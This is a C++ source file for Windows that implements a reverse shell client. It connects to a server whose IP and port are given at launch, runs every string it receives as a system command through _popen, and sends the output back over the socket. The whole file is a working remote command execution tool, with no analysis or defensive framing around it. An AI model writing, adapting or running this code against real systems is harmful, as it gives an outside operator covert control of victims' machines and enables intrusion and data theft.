#include <iostream>
#include <thread>
#include <string>
#include <winsock2.h>
#include <cstring>
#include <cstdlib>

#pragma comment(lib, "Ws2_32.lib")

#pragma warning(disable:4996) 

using namespace std;
 

void executeCommand(char bufferCommand[], SOCKET clientSocket) {
    string str(bufferCommand);
    std::string temp = str;
    temp.erase(std::remove(temp.begin(), temp.end(), '\n'), temp.end());

    if (temp == "exit") {
        exit(0);
    }

    cout << "The command is " << str << endl;
    
    FILE* pipe = _popen(str.c_str(), "r");
    if (!pipe) {
        std::cerr << "Failed to execute command: " << str << endl;
    }
    char buffer[128];
    std::string result = "";
    while (fgets(buffer, 128, pipe) != NULL) {
        result += buffer; 
    }

    _pclose(pipe);
    std::cout << "Command output: " << endl << result << endl;

    int iResult = send(clientSocket, result.c_str(), result.size(), 0);
    if (iResult == SOCKET_ERROR) {
        cout << "Failed to send " << WSAGetLastError() << endl;
        cout << "Couldn't send the last message to the target.";
        closesocket(clientSocket);
        WSACleanup();
    }
    

}

void receiveMessages(SOCKET clientSocket) {
    while (true) {
        char buffer[1024] = { 0 };
        int valread = recv(clientSocket, buffer, 1024, 0);
            if (valread <= 0) {
                cout << "Disconnected from the server." << endl;
                exit(0);
                break;
            }
        cout << "Received: " << buffer << endl;
        executeCommand(buffer, clientSocket);

    }
}

int main(int argc, char* argv[]) {
    string ip = argv[1];
    int port = stoi(argv[2]);
    cout << "the ip is: " << ip << " and the port is: " << port << endl;

    WSADATA wsData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsData);
    if (iResult != 0) {
        cout << "WSAStartup failed: " << iResult << endl;
        return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        cout << "Failed to create socket: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port); //Server PORT //htons = Because network protocols use big endian byte order
    
    serverAddr.sin_addr.s_addr = inet_addr(ip.c_str()); //Server IP

    iResult = connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (iResult == SOCKET_ERROR) {
        cout << "Failed to connect: " << WSAGetLastError() << endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }


    cout << "Connected to the server. " << endl;

    thread receiveThread(receiveMessages, clientSocket);
    receiveThread.detach();

    while (true) {
        string message;
        cin >> message;
        if (message == "quit")
        {
            break;
        }

        iResult = send(clientSocket, message.c_str(), message.size(), 0);
        if (iResult == SOCKET_ERROR) {
            cout << "Failed to send " << WSAGetLastError() << endl;
            cout << "Couldn't send the last message to the target.";
            closesocket(clientSocket);
            WSACleanup();
            return 1;
        }
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;





}


